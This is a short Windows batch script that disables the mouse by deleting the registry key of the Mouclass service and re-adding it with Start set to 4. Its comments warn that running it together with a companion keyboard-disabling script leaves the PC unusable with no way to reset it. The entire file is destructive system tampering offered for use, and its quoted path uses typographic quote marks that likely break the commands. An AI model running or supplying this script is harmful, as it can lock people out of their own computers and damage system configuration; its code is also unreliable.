@echo off
:: Never run the Disable Mouse.bat and Disable Keyboard.bat in the same sitting.
:: This will render your PC useless as you won't be able to do anything to reset its effects.

rem Disable user mouse.
set key=”HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass”
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
